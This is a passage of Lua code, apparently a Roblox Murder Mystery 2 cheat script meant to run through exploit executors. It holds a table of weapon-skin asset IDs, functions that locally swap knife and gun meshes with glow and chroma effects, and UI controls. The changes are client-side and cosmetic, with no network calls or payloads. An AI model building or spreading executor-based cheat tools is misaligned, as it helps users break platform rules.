    ["Gingermint_K"] = { MeshId = "", TextureId = "", Type = "Knife" },
    ["Gingermint_KChroma"] = { MeshId = "", TextureId = "rbxassetid://11883888650", Chroma = true, Type = "Knife" },
    ["Darksword"] = { MeshId = "rbxassetid://15020899066", TextureId = "rbxassetid://15020899218", Scale = Vector3.new(0.08, 0.08, 0.08), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Deathshard"] = { MeshId = "http://www.roblox.com/asset/?id=62275962 ", TextureId = "http://www.roblox.com/asset/?id=192567360", Scale = Vector3.new(0.75, 0.75, 0.75), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["DeathshardChroma"] = { MeshId = "rbxassetid://62275962", TextureId = "rbxassetid://3167029738", Scale = Vector3.new(0.8, 0.8, 0.8), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["Eggblade"] = { MeshId = "rbxassetid://6596834762", TextureId = "http://www.roblox.com/asset/?id=6596824396", Type = "Knife" },
    ["ElderwoodKnife"] = { MeshId = "rbxassetid://11238166013", TextureId = "rbxassetid://11238176757", Scale = Vector3.new(0.07, 0.07, 0.07), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["ElderwoodKnifeChroma"] = { MeshId = "rbxassetid://11238166013", TextureId = "http://www.roblox.com/asset/?id=11370088878", Scale = Vector3.new(0.07, 0.07, 0.07), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["Eternal"] = { MeshId = "rbxassetid://532155954", TextureId = "rbxassetid://532156041", Scale = Vector3.new(0.45, 0.45, 0.45), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Eternal2"] = { MeshId = "rbxassetid://532155954", TextureId = "rbxassetid://2585776718", Scale = Vector3.new(0.45, 0.45, 0.45), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Eternal3"] = { MeshId = "rbxassetid://532155954", TextureId = "rbxassetid://5238664918", Scale = Vector3.new(0.47, 0.47, 0.47), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Eternal4"] = { MeshId = "rbxassetid://532155954", TextureId = "rbxassetid://5222717744", Scale = Vector3.new(0.47, 0.47, 0.47), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["EternalCane"] = { MeshId = "rbxassetid://3132923779", TextureId = "rbxassetid://4488374804", Scale = Vector3.new(0.95, 0.95, 0.95), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["TreeKnife2023"] = { MeshId = "rbxassetid://15408281195", TextureId = "rbxassetid://15408244684", Scale = Vector3.new(0.0046, 0.0046, 0.0046), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["TreeKnife2023Chroma"] = { MeshId = "rbxassetid://15408281298", TextureId = "rbxassetid://15693337518", Scale = Vector3.new(0.0046, 0.0046, 0.0046), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["Fang"] = { MeshId = "http://www.roblox.com/asset/?id=117500241", TextureId = "http://www.roblox.com/asset/?id=117500388", Scale = Vector3.new(0.4, 0.4, 0.4), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["FangChroma"] = { MeshId = "rbxassetid://117500241", TextureId = "rbxassetid://3167057391", Scale = Vector3.new(0.4, 0.37, 0.37), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["Flames"] = { MeshId = "http://www.roblox.com/asset/?id=238314098", TextureId = "http://www.roblox.com/asset/?id=238314124", Scale = Vector3.new(0.6, 0.8, 0.73), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["FlowerwoodKnife"] = { MeshId = "rbxassetid://16883629972", TextureId = "rbxassetid://16895441338", Type = "Knife" },
    ["Frostbite"] = { MeshId = "http://www.roblox.com/asset?id=4528435571", TextureId = "rbxassetid://5211130051", Scale = Vector3.new(1.1, 1.1, 1.1), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Frostsaber"] = { MeshId = "rbxassetid://1192795322", TextureId = "rbxassetid://1192795941", Scale = Vector3.new(0.55, 0.55, 0.6), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Gemstone"] = { MeshId = "rbxassetid://1626714161", TextureId = "rbxassetid://3183579677", Scale = Vector3.new(25, 25, 25), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["GemstoneChroma"] = { MeshId = "rbxassetid://1626714161", TextureId = "rbxassetid://3183577898", Scale = Vector3.new(25, 25, 25), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["Ghostblade"] = { MeshId = "rbxassetid://4217554208", TextureId = "rbxassetid://5007736173", Scale = Vector3.new(0.05, 0.05, 0.05), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["GingerbladeChroma"] = { MeshId = "rbxassetid://2682453204", TextureId = "rbxassetid://2672327402", Scale = Vector3.new(0.61, 0.61, 0.61), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["Gingerblade"] = { MeshId = "rbxassetid://2682453204", TextureId = "rbxassetid://2682446647", Scale = Vector3.new(0.61, 0.61, 0.61), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["HallowsBlade"] = { MeshId = "http://www.roblox.com/asset?id=179155055", TextureId = "rbxassetid://1132750758", Scale = Vector3.new(0.55, 0.55, 0.555), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Hallow"] = { MeshId = "http://www.roblox.com/asset?id=179155055", TextureId = "http://www.roblox.com/asset?id=179155105", Scale = Vector3.new(0.57, 0.57, 0.57), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Handsaw"] = { MeshId = "", TextureId = "", Type = "Knife" },
    ["HeartWandChroma"] = { MeshId = "rbxassetid://77738838473091", TextureId = "rbxassetid://78842905206144", Scale = Vector3.new(0.07821, 0.07821, 0.07821), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["HeartWand"] = { MeshId = "rbxassetid://77738838473091", TextureId = "rbxassetid://76246633927299", Type = "Knife" },
    ["Heartblade"] = { MeshId = "rbxassetid://6404140078", TextureId = "http://www.roblox.com/asset/?id=6413074818", Type = "Knife" },
    ["HeatChroma"] = { MeshId = "http://www.roblox.com/asset/?id=105333894", TextureId = "http://www.roblox.com/asset/?id=105334003", Scale = Vector3.new(0.33, 0.33, 0.33), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["Heat"] = { MeshId = "http://www.roblox.com/asset/?id=105333894", TextureId = "http://www.roblox.com/asset/?id=105334003", Scale = Vector3.new(0.3, 0.3, 0.3), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["IceDragon"] = { MeshId = "http://www.roblox.com/asset/?id=165708869 ", TextureId = "http://www.roblox.com/asset/?id=165708903 ", Scale = Vector3.new(0.5, 0.5, 0.5), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["IceShard"] = { MeshId = "http://www.roblox.com/asset/?id=188539751", TextureId = "http://www.roblox.com/asset/?id=188539820", Scale = Vector3.new(0.85, 0.85, 0.85), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Iceflake"] = { MeshId = "rbxassetid://8231045240", TextureId = "rbxassetid://8231046270", Type = "Knife" },
    ["Nebula"] = { MeshId = "rbxassetid://6596839942", TextureId = "http://www.roblox.com/asset/?id=6256756879", Type = "Knife" },
    ["Nightblade"] = { MeshId = "http://www.roblox.com/asset/?id=103838505", TextureId = "http://www.roblox.com/asset/?id=103838996", Scale = Vector3.new(0.7, 0.45, 0.5), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(0.4, 0.4, 0.4), Type = "Knife" },
    ["AmericaSword"] = { MeshId = "http://www.roblox.com/asset/?id=262027449", TextureId = "https://www.roblox.com/asset/?id=445805934", Scale = Vector3.new(0.6, 0.6, 0.6), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["OrangeSeer"] = { MeshId = "http://www.roblox.com/asset?id=156092238", TextureId = "rbxassetid://3184063179", Scale = Vector3.new(0.7, 0.91, 1), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["BaubleKnife"] = { MeshId = "rbxassetid://116508096109443", TextureId = "rbxassetid://135843404105980", Type = "Knife" },
    ["BaubleKnifeChroma"] = { MeshId = "rbxassetid://116508096109443", TextureId = "rbxassetid://101916509598198", Scale = Vector3.new(0.07326, 0.07326, 0.07326), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["Pearl_K"] = { MeshId = "rbxassetid://18276861801", TextureId = "rbxassetid://18276866373", Type = "Knife" },
    ["Peppermint"] = { MeshId = "rbxassetid://6085025295", TextureId = "rbxassetid://6074789360", Scale = Vector3.new(0.07, 0.07, 0.07), Offset = Vector3.new(0, 0.3, -0.1), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Phantom2022"] = { MeshId = "", TextureId = "", Type = "Knife" },
    ["Pixel"] = { MeshId = "http://www.roblox.com/asset/?id=361629844", TextureId = "http://www.roblox.com/asset/?id=361630114", Scale = Vector3.new(3, 3, 3), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Plasmablade"] = { MeshId = "rbxassetid://9702732853", TextureId = "rbxassetid://10015130416", Type = "Knife" },
    ["Prismatic"] = { MeshId = "rbxassetid://5355753728", TextureId = "rbxassetid://5355747943", Scale = Vector3.new(0.06, 0.06917, 0.06), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Pumpking"] = { MeshId = "http://www.roblox.com/asset/?id=94840342", TextureId = "rbxassetid://1164426571", Scale = Vector3.new(0.4, 0.4, 0.4), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["PurpleSeer"] = { MeshId = "http://www.roblox.com/asset?id=156092238", TextureId = "rbxassetid://3184063317", Scale = Vector3.new(0.7, 0.91, 1), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Rainbow_K"] = { MeshId = "rbxassetid://12921240966", TextureId = "rbxassetid://12921241867", Type = "Knife" },
    ["RedSeer"] = { MeshId = "http://www.roblox.com/asset?id=156092238", TextureId = "rbxassetid://3184063443", Scale = Vector3.new(0.7, 0.91, 1), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Sakura_K"] = { MeshId = "rbxassetid://12307707430", TextureId = "rbxassetid://12307707797", Type = "Knife" },
    ["Saw"] = { MeshId = "http://www.roblox.com/asset?id=168119698", TextureId = "http://www.roblox.com/asset?id=168119736", Scale = Vector3.new(0.5, 0.5, 0.5), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["SawChroma"] = { MeshId = "rbxassetid://168119698", TextureId = "rbxassetid://3171086347", Scale = Vector3.new(0.5, 0.5, 0.55), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["TheSeer"] = { MeshId = "http://www.roblox.com/asset?id=156092238", TextureId = "http://www.roblox.com/asset?id=156092253 ", Scale = Vector3.new(0.7, 0.91, 1), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["SeerChroma"] = { MeshId = "rbxassetid://156092238", TextureId = "rbxassetid://3184059718", Scale = Vector3.new(0.7, 0.91, 1), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["SlasherChroma"] = { MeshId = "rbxassetid://283709822", TextureId = "rbxassetid://3171107559", Scale = Vector3.new(0.45, 0.45, 0.45), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["Slasher"] = { MeshId = "http://www.roblox.com/asset/?id=283709822", TextureId = "http://www.roblox.com/asset/?id=313894904", Scale = Vector3.new(0.45, 0.45, 0.45), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["SnowDaggerChroma"] = { MeshId = "rbxassetid://140633396635861", TextureId = "rbxassetid://109403096491788", Scale = Vector3.new(0.05978, 0.05978, 0.05978), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["SnowDagger"] = { MeshId = "rbxassetid://140633396635861", TextureId = "rbxassetid://77812964601215", Type = "Knife" },
    ["Snowflake"] = { MeshId = "rbxassetid://582120569", TextureId = "rbxassetid://582120836", Scale = Vector3.new(0.6, 0.6, 0.6), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["SnowstormChroma"] = { MeshId = "rbxassetid://86944837615327", TextureId = "rbxassetid://86253759560362", Scale = Vector3.new(0.07705, 0.07705, 0.07705), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["Spider"] = { MeshId = "http://www.roblox.com/asset/?id=302165984", TextureId = "rbxassetid://7596177341", Scale = Vector3.new(0.6, 0.6, 0.6), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["WraithKnife"] = { MeshId = "rbxassetid://112444333460928", TextureId = "rbxassetid://131787177447081", Type = "Knife" },
    ["SunsetKnifeChroma"] = { MeshId = "rbxassetid://137082284051764", TextureId = "rbxassetid://93782017269677", Scale = Vector3.new(0.07, 0.07, 0.07), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["SunsetKnife"] = { MeshId = "rbxassetid://137082284051764", TextureId = "rbxassetid://95001575076131", Scale = Vector3.new(0.07391, 0.07391, 0.07391), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["SweetChroma"] = { MeshId = "rbxassetid://88250692342609", TextureId = "rbxassetid://87741741305052", Scale = Vector3.new(0.06913, 0.06913, 0.06913), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["SwirlyBlade"] = { MeshId = "rbxassetid://8302964090", TextureId = "rbxassetid://8302965681", Type = "Knife" },
    ["Tides"] = { MeshId = "http://www.roblox.com/asset/?id=238314382", TextureId = "http://www.roblox.com/asset/?id=238314431", Scale = Vector3.new(0.7, 0.9, 0.7), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["TidesChroma"] = { MeshId = "rbxassetid://238314382", TextureId = "rbxassetid://3171168641", Scale = Vector3.new(0.7, 0.9, 0.7), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["Turkey2023"] = { MeshId = "rbxassetid://15320557481", TextureId = "rbxassetid://15320558272", Scale = Vector3.new(0.056, 0.056, 0.056), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["VampiresEdge"] = { MeshId = "rbxassetid://5841895234", TextureId = "http://www.roblox.com/asset/?id=5842343736", Type = "Knife" },
    ["Virtual"] = { MeshId = "http://www.roblox.com/asset/?id=130101214", TextureId = "https://www.roblox.com/asset/?id=386250868", Scale = Vector3.new(0.6, 0.6, 0.7), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Waves_K"] = { MeshId = "rbxassetid://13916938702", TextureId = "rbxassetid://13916939964", Type = "Knife" },
    ["WintersEdge"] = { MeshId = "http://www.roblox.com/asset/?id=93108071", TextureId = "http://www.roblox.com/asset/?id=93112631", Scale = Vector3.new(0.45, 0.45, 0.45), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["XenoKnife"] = { MeshId = "rbxassetid://136619680236977", TextureId = "rbxassetid://113651973865393", Type = "Knife" },
    ["Xmas"] = { MeshId = "rbxassetid://187852667", TextureId = "rbxassetid://187852629", Scale = Vector3.new(0.6, 0.6, 0.6), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["YellowSeer"] = { MeshId = "http://www.roblox.com/asset?id=156092238", TextureId = "rbxassetid://3184063623", Scale = Vector3.new(0.7, 0.91, 1), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
}

    local function cleanToolVisuals(tool)
        if not tool then return end
        for _, child in ipairs(tool:GetChildren()) do
            if child.Name == "RanaxVisualPart" or child.Name == "RanaxGlowHighlight" or child.Name == "RanaxMeeqSkin" then
                pcall(function() child:Destroy() end)
            end
        end
        local handle = tool:FindFirstChild("Handle") or tool:FindFirstChildOfClass("BasePart")
        if handle then
            handle.Transparency = 0
            for _, child in ipairs(handle:GetChildren()) do
                if child.Name == "RanaxWeaponEffect" or child.Name == "RanaxGlowLight" or child.Name == "RanaxMeeqSkin" then
                    pcall(function() child:Destroy() end)
                end
            end
        end
    end

    -- Direct Native Skin Transformer (Zero HTTP lag, 100% reliable on all executors)
    local function applySkinToTool(tool, skinName)
        if not tool or not tool:IsA("Tool") then return false end
        local handle = tool:FindFirstChild("Handle") or tool:FindFirstChildOfClass("BasePart")
        if not handle then return false end

        local sm = handle:FindFirstChildOfClass("SpecialMesh") or handle:FindFirstChild("Mesh")
        if not sm then
            sm = Instance.new("SpecialMesh")
            sm.Name = "Mesh"
            sm.MeshType = Enum.MeshType.FileMesh
            sm.Parent = handle
        end

        -- Backup original tool mesh properties once
        if not tool:GetAttribute("RanaxOrigMesh") and sm.MeshId ~= "" then
            tool:SetAttribute("RanaxOrigMesh", sm.MeshId)
            tool:SetAttribute("RanaxOrigTex", sm.TextureId)
            tool:SetAttribute("RanaxOrigScale", sm.Scale)
            tool:SetAttribute("RanaxOrigVC", sm.VertexColor)
        end

        cleanToolVisuals(tool)

        local scaleMult = tonumber(_skinChanger.WeaponScale) or 1.0
        local weapon = MeeqWeaponDatabase[skinName]

        if weapon and weapon.MeshId and weapon.MeshId ~= "" then
            sm.MeshId = weapon.MeshId
            sm.TextureId = weapon.TextureId or ""
            sm.Scale = (weapon.Scale or Vector3.new(1, 1, 1)) * scaleMult
            if weapon.Offset then sm.Offset = weapon.Offset else sm.Offset = Vector3.zero end
            if weapon.VertexColor then sm.VertexColor = weapon.VertexColor else sm.VertexColor = Vector3.new(1, 1, 1) end
            handle.Transparency = 0

            if weapon.Chroma then
                _skinChanger.ChromaRainbow = true
                if typeof(updateChromaListener) == "function" then
                    updateChromaListener(true)
                end
            end

            -- Custom Glow
            if _skinChanger.GlowEnabled then
                local pl = Instance.new("PointLight")
                pl.Name = "RanaxGlowLight"
                pl.Range = 12
                pl.Brightness = 3
                pl.Color = _skinChanger.GlowColor
                pl.Parent = handle

                local hl = Instance.new("Highlight")
                hl.Name = "RanaxGlowHighlight"
                hl.FillTransparency = 0.5
                hl.OutlineTransparency = 0.1
                hl.FillColor = _skinChanger.GlowColor
                hl.OutlineColor = _skinChanger.GlowColor
                hl.Adornee = tool
                hl.Parent = tool
            end

            tool:SetAttribute("RanaxSkinApplied", skinName)
            return true
        end

        -- Fallback to AssetDatabase if any
        local fallback = AssetDatabase and AssetDatabase[skinName]
        if fallback and fallback.Mesh then
            sm.MeshId = fallback.Mesh
            if fallback.Texture then sm.TextureId = fallback.Texture end
            sm.Scale = (fallback.Scale or Vector3.new(1, 1, 1)) * scaleMult
            if fallback.VertexColor then sm.VertexColor = fallback.VertexColor end
            handle.Transparency = 0
            tool:SetAttribute("RanaxSkinApplied", skinName)
            return true
        end

        return false
    end

    local function isKnife(tool)
        if not tool or not tool:IsA("Tool") then return false end
        local n = tool.Name:lower()
        if n:find("knife") or tool:FindFirstChild("KnifeClient") or tool:FindFirstChild("KnifeServer") or tool:FindFirstChild("Slash") then
            return true
        end
        return false
    end

    local function isGun(tool)
        if not tool or not tool:IsA("Tool") then return false end
        local n = tool.Name:lower()
        if n:find("gun") or n:find("revolver") or tool:FindFirstChild("GunClient") or tool:FindFirstChild("GunServer") or tool:FindFirstChild("Shoot") then
            return true
        end
        return false
    end

    local function updateEquippedSkins()
        local char = LocalPlayer.Character
        local bp = LocalPlayer:FindFirstChild("Backpack")

        local toolsToCheck = {}
        if char then
            for _, t in ipairs(char:GetChildren()) do
                if t:IsA("Tool") then table.insert(toolsToCheck, t) end
            end
        end
        if bp then
            for _, t in ipairs(bp:GetChildren()) do
                if t:IsA("Tool") then table.insert(toolsToCheck, t) end
            end
        end

        for _, tool in ipairs(toolsToCheck) do
            local knifeMatch = isKnife(tool)
            local gunMatch = isGun(tool)

            if not knifeMatch and not gunMatch then
                -- Single weapon in MM2 heuristic
                if tool.Name ~= "Emotes" and tool.Name ~= "Toy" and tool.Name ~= "Radio" then
                    knifeMatch = true
                end
            end

            if knifeMatch and _skinChanger.KnifeEnabled then
                if tool:GetAttribute("RanaxSkinApplied") ~= _skinChanger.SelectedKnife then
                    applySkinToTool(tool, _skinChanger.SelectedKnife)
                end
            elseif gunMatch and _skinChanger.GunEnabled then
                if tool:GetAttribute("RanaxSkinApplied") ~= _skinChanger.SelectedGun then
                    applySkinToTool(tool, _skinChanger.SelectedGun)
                end
            end
        end
    end

    -- Chroma RGB Rainbow Cycle (Connects ONLY when ChromaRainbow is ON, 0 FPS cost when OFF!)
    local _chromaConn = nil
    local function updateChromaListener(active)
        if active then
            if _chromaConn then return end
            local _lastChromaTick = 0
            _chromaConn = RunService.RenderStepped:Connect(function()
                if not _skinChanger.ChromaRainbow then
                    if _chromaConn then _chromaConn:Disconnect(); _chromaConn = nil end
                    return
                end
                local now = os.clock()
                if now - _lastChromaTick < 0.05 then return end
                _lastChromaTick = now

                local speed = tonumber(_skinChanger.ChromaSpeed) or 1.0
                local hue = (os.clock() * speed * 0.4) % 1
                local chromaColor = Color3.fromHSV(hue, 1, 1)

                local char = LocalPlayer.Character
                if not char then return end

                for _, tool in ipairs(char:GetChildren()) do
                    if tool:IsA("Tool") then
                        local handle = tool:FindFirstChild("Handle") or tool:FindFirstChildOfClass("BasePart")
                        if handle then
                            local sm = handle:FindFirstChildOfClass("SpecialMesh") or handle:FindFirstChild("Mesh")
                            if sm then
                                sm.VertexColor = Vector3.new(chromaColor.R * 2, chromaColor.G * 2, chromaColor.B * 2)
                            end
                            local hl = tool:FindFirstChild("RanaxGlowHighlight")
                            if hl then
                                hl.FillColor = chromaColor
                                hl.OutlineColor = chromaColor
                            end
                            local pl = handle:FindFirstChild("RanaxGlowLight")
                            if pl then
                                pl.Color = chromaColor
                            end
                        end
                    end
                end
            end)
        else
            if _chromaConn then
                _chromaConn:Disconnect()
                _chromaConn = nil
            end
        end
    end
    _G.RanaxUpdateChromaListener = updateChromaListener

    -- Auto-hook character and backpack weapons
    local function hookTool(tool)
        if not tool:IsA("Tool") then return end
        tool.Equipped:Connect(function()
            task.wait(0.05)
            updateEquippedSkins()
        end)
    end

    local function hookContainer(container)
        if not container then return end
        container.ChildAdded:Connect(function(child)
            if child:IsA("Tool") then
                hookTool(child)
                task.wait(0.08)
                updateEquippedSkins()
            end
        end)
        for _, child in ipairs(container:GetChildren()) do
            if child:IsA("Tool") then
                hookTool(child)
            end
        end
    end

    if LocalPlayer.Character then hookContainer(LocalPlayer.Character) end
    LocalPlayer.CharacterAdded:Connect(function(char)
        task.wait(0.3)
        hookContainer(char)
        updateEquippedSkins()
    end)

    if LocalPlayer:FindFirstChild("Backpack") then hookContainer(LocalPlayer.Backpack) end
    LocalPlayer.ChildAdded:Connect(function(child)
        if child:IsA("Backpack") then
            task.wait(0.1)
            hookContainer(child)
            updateEquippedSkins()
        end
    end)

    -- Continuous heartbeat watcher (prevents weapon revert on throw or round start)
    task.spawn(function()
        while task.wait(0.35) do
            if _skinChanger.KnifeEnabled or _skinChanger.GunEnabled then
                pcall(updateEquippedSkins)
            end
        end
    end)

    -- UI CONTROLS
    SkinChangerTab:Section({
        Title = "🔪 Knife Skin Changer",
        TextXAlignment = "Left",
        TextSize = 16
    })

    SkinChangerTab:Toggle({
        Title = "Enable Knife Skin",
        Desc = "Automatically transforms your equipped knife into the selected Godly/Ancient skin",
        Icon = "sword",
        Type = "Checkbox",
        Value = false,
        Callback = function(val)
            _skinChanger.KnifeEnabled = val
            if val then
                updateEquippedSkins()
                notify("Skin Changer", "Knife skin: " .. tostring(_skinChanger.SelectedKnife), 2.5, "sword")
            else
                local char = LocalPlayer.Character
                local bp = LocalPlayer:FindFirstChild("Backpack")
                if char then for _, t in ipairs(char:GetChildren()) do if t:IsA("Tool") then cleanToolVisuals(t); t:SetAttribute("RanaxSkinApplied", nil) end end end
                if bp then for _, t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then cleanToolVisuals(t); t:SetAttribute("RanaxSkinApplied", nil) end end end
                notify("Skin Changer", "Knife skin disabled", 2, "x")
            end
        end
    })

    SkinChangerTab:Dropdown({
        Title = "Select Knife Skin",
        Desc = "Choose from all available Godly, Ancient, and Chroma Knives",
        Icon = "sparkles",
        Values = KnifeOptions,
        Value = "Harvester",
        Multi = false,
        AllowNone = false,
        Callback = function(opt)
            _skinChanger.SelectedKnife = opt
            if _skinChanger.KnifeEnabled then
                local char = LocalPlayer.Character
                local bp = LocalPlayer:FindFirstChild("Backpack")
                if char then for _, t in ipairs(char:GetChildren()) do if t:IsA("Tool") then t:SetAttribute("RanaxSkinApplied", nil) end end end
                if bp then for _, t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then t:SetAttribute("RanaxSkinApplied", nil) end end end
                updateEquippedSkins()
                notify("Skin Changer", "Equipped: " .. tostring(opt), 2, "sparkles")
            end
        end
    })

    SkinChangerTab:Section({
        Title = "🔫 Gun Skin Changer",
        TextXAlignment = "Left",
        TextSize = 16
    })

    SkinChangerTab:Toggle({
        Title = "Enable Gun Skin",
        Desc = "Automatically transforms your equipped gun into the selected Godly/Chroma skin",
        Icon = "crosshair",
        Type = "Checkbox",
        Value = false,
        Callback = function(val)
            _skinChanger.GunEnabled = val
            if val then
                updateEquippedSkins()
                notify("Skin Changer", "Gun skin: " .. tostring(_skinChanger.SelectedGun), 2.5, "crosshair")
            else
                local char = LocalPlayer.Character
                local bp = LocalPlayer:FindFirstChild("Backpack")
                if char then for _, t in ipairs(char:GetChildren()) do if t:IsA("Tool") then cleanToolVisuals(t); t:SetAttribute("RanaxSkinApplied", nil) end end end
                if bp then for _, t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then cleanToolVisuals(t); t:SetAttribute("RanaxSkinApplied", nil) end end end
                notify("Skin Changer", "Gun skin disabled", 2, "x")
            end
        end
    })

    SkinChangerTab:Dropdown({
        Title = "Select Gun Skin",
        Desc = "Choose from all available Godly, Vintage, and Chroma Guns",
        Icon = "zap",
        Values = GunOptions,
        Value = "Chroma Darkbringer",
        Multi = false,
        AllowNone = false,
        Callback = function(opt)
            _skinChanger.SelectedGun = opt
            if _skinChanger.GunEnabled then
                local char = LocalPlayer.Character
                local bp = LocalPlayer:FindFirstChild("Backpack")
                if char then for _, t in ipairs(char:GetChildren()) do if t:IsA("Tool") then t:SetAttribute("RanaxSkinApplied", nil) end end end
                if bp then for _, t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then t:SetAttribute("RanaxSkinApplied", nil) end end end
                updateEquippedSkins()
                notify("Skin Changer", "Equipped: " .. tostring(opt), 2, "zap")
            end
        end
    })

    SkinChangerTab:Section({
        Title = "✨ Visual Effects & Chroma",
        TextXAlignment = "Left",
        TextSize = 16
    })

    SkinChangerTab:Toggle({
        Title = "Chroma RGB Rainbow Effect",
        Desc = "Cycles your weapon through smooth dynamic RGB rainbow Chroma colors",
        Icon = "palette",
        Type = "Checkbox",
        Value = false,
        Callback = function(val)
            _skinChanger.ChromaRainbow = val
            notify("Skin Changer", "Chroma RGB: " .. (val and "ON" or "OFF"), 2, "palette")
        end
    })

    SkinChangerTab:Slider({
        Title = "Chroma Cycle Speed",
        Desc = "Speed of the Chroma rainbow color transition",
        Step = 0.1,
        Value = {
            Min = 0.2,
            Max = 4.0,
            Default = 1.0
        },
        Callback = function(val)
            _skinChanger.ChromaSpeed = val
        end
    })

    SkinChangerTab:Dropdown({
        Title = "Custom Particle Aura",
        Desc = "Add an animated particle aura to your weapon",
